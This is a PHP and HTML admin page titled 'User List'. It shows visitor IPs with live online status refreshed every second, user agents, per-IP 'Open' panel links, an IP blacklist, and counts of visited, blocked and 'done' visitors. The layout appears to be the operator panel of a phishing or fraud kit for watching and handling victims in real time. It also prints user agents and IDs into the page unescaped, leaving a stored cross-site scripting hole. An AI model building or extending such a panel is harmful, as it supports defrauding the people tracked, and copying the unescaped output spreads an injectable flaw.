<?php if (isset($_GET['fetch'])) { ?>
    <?php foreach ($users as $id => $user): ?>
        <tr class="user-item" data-user-id="<?php echo $id; ?>">
            <td><?php echo str_replace('_', '.', $id); ?></td>
            <td>
                <span class="status-label"><?php echo $user['online'] ? "ONLINE" : 'OFFLINE'; ?></span>
            </td>
            <td><a href="./del?ip=<?php echo $id; ?>" target="_blank" id="bl" style="background-color: #f44336">Delete</a></td>
            <td><a href="./<?php echo $id; ?>" id="bl" style="background-color: #4CAF50" >Open</a></td>
            <td><?php echo $user['useragent']?></td>
        </tr>
    <?php endforeach; ?>
<?php die(); } ?>

<?php
$jsonFile = '../restricted.json';

function readIps() {
    global $jsonFile;
    if (file_exists($jsonFile)) {
        return json_decode(file_get_contents($jsonFile), true);
    }
    return [];
}
$blocked = readIps();

$totalVisited = count($users);
$totalBlocked = count($blocked);
$totalDone = 0;
foreach ($users as $user) {
    if (isset($user['done']) && $user['done'] === true) {
        $totalDone++;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User List</title>
    <script src="https://cdn.jsdelivr.net/npm/apexcharts"></script>


    <style>
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #000;
            color: #E0E0E0;
            height: 100vh;
            background-image: url('img/bg.png');
            background-repeat: no-repeat;
            background-size: cover;
            background-position: center center;
        }

        .container {
            width: 70%;
            margin: 50px auto;
            padding: 30px;
            display: flex;
            flex-direction: column;
            align-items: center;
            background-color: #1E1E1ECC;
            border-radius: 16px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
            transition: all 0.3s ease-in-out;
        }

        .container:hover {
            transform: translateY(-5px);
        }

        h1 {
            text-align: center;
            color: #FFF;
            font-size: 2.2rem;
            margin-bottom: 30px;
            font-weight: 600;
        }

        .stats {
            margin-bottom: 20px;
            color: #FFF;
            font-size: 1.1rem;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            color: #fff;
        }

        th, td {
            padding: 12px 18px;
            text-align: left;
            white-space: nowrap;
        }

        th {
            background-color: #333;
            color: #E0E0E0;
            font-weight: bold;
        }

        tr:nth-child(even) {
            background-color: #2A2A2A;
        }

        tr:hover {
            background-color: #444;
        }

        .responsive-table {
            width: 100%;
            overflow-x: auto;
            -webkit-overflow-scrolling: touch;
        }


        @media (max-width: 600px) {
            th, td {
                padding: 10px 12px;
                font-size: 14px;
            }

            #bl {
                padding: 5px 10px;
                font-size: 13px;
            }
        }


        .status {
            width: 14px;
            height: 14px;
            border-radius: 50%;
            display: inline-block;
            margin-right: 8px;
        }

        .online {
            background-color: #4CAF50;
        }

        .offline {
            background-color: #f44336;
        }

        .status-label {
            color: #AAA;
        }

        .button-container {
            display: flex;
            gap: 20px;
            margin-top: 20px;
            justify-content: center;
        }

        .button {
            padding: 12px 30px;
            font-size: 16px;
            font-weight: 600;
            text-align: center;
            text-decoration: none;
            background-color: #333;
            color: #E0E0E0;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
            transition: all 0.3s ease-in-out;
            border: 2px solid transparent;
            cursor: pointer;
        }

        .button:hover {
            background-color: #4CAF50;
            color: #fff;
            transform: translateY(-2px);
            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.3);
            border-color: #4CAF50;
        }

        .button:focus {
            outline: 2px solid #ff9800;
            outline-offset: 2px;
        }

        @media (max-width: 768px) {
            .container {
                width: 90%;
                padding: 20px;
            }

            h1 {
                font-size: 1.8rem;
            }

            .button {
                font-size: 16px;
                padding: 10px 20px;
            }
        }

        @media (max-width: 480px) {
            h1 {
                font-size: 1.6rem;
            }

            .button {
                font-size: 14px;
                padding: 8px 16px;
            }
        }

        #bl {
            display: inline-block;
            padding: 10px 20px;
            font-size: 16px;
            text-align: center;
            text-decoration: none;
            border-radius: 5px;
            background-color: #4CAF50;
            color: white;
            border: 1px solid #4CAF50;
            transition: background-color 0.3s, transform 0.3s;
        }

        #bl:hover {
            background-color: #45a049;
            transform: translateY(-2px);
        }

        .stats {
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            padding: 20px;
            margin: 20px;
            width: 300px;
        }
        .stats p{}
        .stats p span {
            font-size: 18px;
            padding: 10px 10px;
            margin-left: 12px;
            width: auto;
            border-radius: 0px;
            color: white;
            display: inline-block;
            border-radius:3px;
        }


        .stats p:nth-child(1) span {
            background-color: #FFC107;
        }

        .stats p:nth-child(2) span {
            background-color: #F44336;
        }

        .stats p:nth-child(3) span {
            background-color: #4CAF50;
        }

        .stats p:hover {
            opacity: 0.8;
        }

        .stats p strong {
            font-weight: bold;
        }

        @media (prefers-color-scheme: dark) {
            #bl {
                background-color: #333;
                color: #fff;
                border: 1px solid #555;
            }

            #bl:hover {
                background-color: #444;
            }
        }

    </style>
</head>
<body>

<div class="container">
    <h1>User List</h1>
    <div class="button-container">
        <a href="./restrictions" class="button">Black List</a>
        <a href="./settings" class="button">Settings</a>
        <a href="./clearall" target="_blank" class="button">Clear All</a>
    </div>

    <div id="chart"></div>
    <div class="stats">
        <p>Total Visited: <span></span> <strong><?php echo $totalVisited; ?></strong></p>
        <p>Total Blocked: <span></span> <strong><?php echo $totalBlocked; ?></strong></p>
        <p>Total Done: <span></span> <strong><?php echo $totalDone; ?></strong></p>
    </div>

    <div class="responsive-table">
        <table id="userList">
            <thead>
                <tr>
                    <th>User IP</th>
                    <th>Status</th>
                    <th>Delete</th>
                    <th>Panel</th>
                    <th>User Agent</th>
                </tr>
            </thead>
            <tbody id="userListtb">
                <?php foreach ($users as $id => $user): ?>
                    <tr class="user-item" data-user-id="<?php echo $id; ?>">
                        <td><?php echo str_replace('_', '.', $id); ?></td>
                        <td><span class="status-label"><?php echo $user['online'] ? "ONLINE" : 'OFFLINE'; ?></span></td>
                        <td><a href="./?del=<?php echo $id; ?>" target="_blank" id="bl" style="background-color: #f44336">Delete</a></td>
                        <td><a href="./<?php echo $id; ?>" id="bl" style="background-color: #4CAF50">Open</a></td>
                        <td><?php echo $user['useragent']?></td>
                    </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>

</div>

<script>
    var statsData = {
        totalVisited: <?php echo $totalVisited; ?>,
        totalBlocked: <?php echo $totalBlocked; ?>,
        totalDone: <?php echo $totalDone; ?>,
    };

    var options = {
        chart: {
            type: 'bar',
            height: '250',
            toolbar: {
                show: true
            },
            background: 'transparent'
        },
        theme: {
            mode: 'dark',
        },
        series: [
            {
                name: 'Counts',
                data: [statsData.totalVisited, statsData.totalBlocked, statsData.totalDone]
            }
        ],
        xaxis: {
            categories: ['Visitors', 'Blocked', 'Completed'],
            labels: {
                style: {
                    colors: '#FFFFFF'
                }
            }
        },
        plotOptions: {
            bar: {
                horizontal: false,
                distributed: true,
                columnWidth: '30%',
                endingShape: 'rounded'
            }
        },
        colors: ['#FFC107', '#F44336', '#4CAF50'],
        dataLabels: {
            enabled: false
        },
        legend: {
            position: 'top',
            labels: {
                colors: '#FFFFFF'
            }
        },
        grid: {
            show: true,
            borderColor: '#444'
        },
        responsive: [
            {
                breakpoint: 768,
                options: {
                    chart: {
                        height: 250
                    },
                    plotOptions: {
                        bar: {
                            columnWidth: '70%'
                        }
                    },
                    legend: {
                        position: 'bottom'
                    }
                }
            }
        ],
    };

    var chart = new ApexCharts(document.querySelector("#chart"), options);
    chart.render();
</script>


<script>
    function refreshUserList() {
        fetch('?fetch=')
            .then(response => response.text())
            .then(data => {
                document.getElementById('userListtb').innerHTML = data;
            });
    }

    setInterval(refreshUserList, 1000);
</script>

</body>
</html>
